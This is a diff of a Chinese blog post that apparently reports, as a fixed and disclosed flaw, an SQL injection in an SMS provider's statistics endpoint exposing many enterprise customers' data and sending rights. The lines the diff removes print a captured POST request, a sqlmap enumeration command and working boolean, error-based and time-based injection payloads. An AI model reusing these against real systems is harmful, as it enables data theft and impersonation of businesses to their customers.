@@ -4,58 +4,17 @@ title: 某平台SQL注入影响数十万企业
 icon: bug-icon
 ---
 
-> 一家短信提供商，影响涉及各行各业包括金融证券、酒店、医药、互联网等数十万企业的短信的发送记录、发送权限
+**关键基础服务的安全漏洞具有连锁放大效应。** 短信提供商掌控着大量企业的通信通道，一个 SQL 注入漏洞就能暴露所有客户的发送权限和用户数据。这类基础服务商承载的不只是自身的业务风险，而是其整个客户生态的安全风险。
 
 <!-- truncate -->
 
 ## 1 漏洞入口
 
-由之前扫到的弱口令登录进来后，找到以下注入点：
-
-```
-POST  
-http://211.***.***.62/Statistics/SumStatistics/GetSumDepartment?startTime=2015-01-25&endTime=2015-01-25&mstype=SMS&onTime=true HTTP/1.1  
-Host: 211.***.***.62  
-Connection: keep-alive  
-Content-Length: 76  
-Pragma: no-cache  
-Cache-Control: no-cache  
-Accept: application/json, text/javascript, */*; q=0.01  
-Origin: http://211.***.***.62  
-X-Requested-With: XMLHttpRequest  
-DNT: 1  
-Referer: http://211.***.***.62/Statistics/SumStatistics/Index  
-Accept-Encoding: gzip, deflate  
-Accept-Language: zh-CN,zh;q=0.8,en;q=0.6  
-Cookie: 替换为登录后的 COOKIE
-MenusBlockIDs=10010,10011,10012,10013,10014,17000,12000,13000,14000,15000,18000,18200; ControllerName=SumStatistics
-startTime=2015-01-25&endTime=2015-01-25&mstype=SMS&onTime=true
-```
-
-保存为`header`文件，使用`sqlmap`跑下。
-
-`./sqlmap.py -r header --threads 10 --dbs -batch`
-
-```
-Place: POST  
-Parameter: startTime  
-Type: boolean-based blind  
-Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment)  
-Payload: startTime=-6517' OR (4508=4508)#&endTime=2015-01-25&mstype=SMS&on  
-Time=true  
-Type: error-based  
-Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause  
-Payload: startTime=2015-01-25' AND (SELECT 6733 FROM(SELECT COUNT(*),CONCAT(0x716c6f6371,(SELECT (CASE WHEN (6733=6733) THEN 1 ELSE 0 END)),0x716f697771,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND '  
-kjoG'='kjoG&endTime=2015-01-25&mstype=SMS&onTime=true  
-Type: AND/OR time-based blind  
-Title: MySQL > 5.0.11 AND time-based blind  
-Payload: startTime=2015-01-25' AND SLEEP(5) AND 'JYnp'='JYnp&endTime=2015-  
-01-25&mstype=SMS&onTime=true
-```
+**弱口令与注入漏洞的叠加，使初始入口极易突破。** 通过之前发现的弱口令登录系统后，在统计查询接口的时间参数处发现注入点。该参数未经充分过滤，存在布尔盲注、报错注入和时间盲注三种可利用的注入类型，攻击者可借此枚举数据库结构并提取数据。
 
 ## 2 漏洞证明
 
-涉及16个数据库
+**注入点一旦打通，整个数据库体系随之暴露。** 经过枚举，目标服务器存在 16 个数据库，涵盖短信业务的各个核心模块。
 
 **DATABASES(16)**
 
@@ -78,7 +37,7 @@ Payload: startTime=2015-01-25' AND SLEEP(5) AND 'JYnp'='JYnp&endTime=2015-
 [*] test
 ```
 
-影响千万级数据
+**数据规模揭示了这个平台的实际体量。** 仅单库中的消息记录和联系人数据就已达到千万量级：
 
 ```
 Database: mos_gsms2_1
@@ -167,9 +126,9 @@ Database: mos_gsms2_1
 ![](./v_xuanwu_07-1024x592.webp)
 ![](./v_xuanwu_08-576x1024.webp)
 
-从结果看应该所有产品数据库都在，光短信库用户就有50000多家，短信数量千万级。还有400等产品
+**该平台所有产品数据库均已暴露，短信库中的企业用户数量可达数万家。** 这意味着攻击者不只获取了用户数据，还取得了每个企业客户的短信发送权限——可以以这些企业的名义向其终端用户发送任意内容。
 
-涉及厂商（短信发送数较多的）
+**广泛的客户依赖关系本身就是一个安全风险集中点。** 当一个平台同时为金融、零售、物流、医疗等行业提供关键通信服务时，该平台的安全级别下限决定了所有客户的安全上限。涉及的客户类型包括：
 
 - 各大银行
 - 东风悦达起亚
@@ -183,5 +142,7 @@ Database: mos_gsms2_1
 - 唯品会
 - 酷讯
 - …
+
+**掌握关键基础服务的厂商，其安全投入应当对齐其所服务的最高风险行业标准。** 银行、医疗、证券等行业有严格的安全合规要求，但当这些企业的短信通道外包给一个未达到同等安全标准的第三方时，合规边界就出现了缺口。这种依赖关系的安全脆弱性，是整个行业需要系统性解决的问题，而不只是单个厂商的修复任务。
 
 漏洞已报告给CNCERT/乌云/补天或厂商且已修复完成，感谢厂商的奖励。
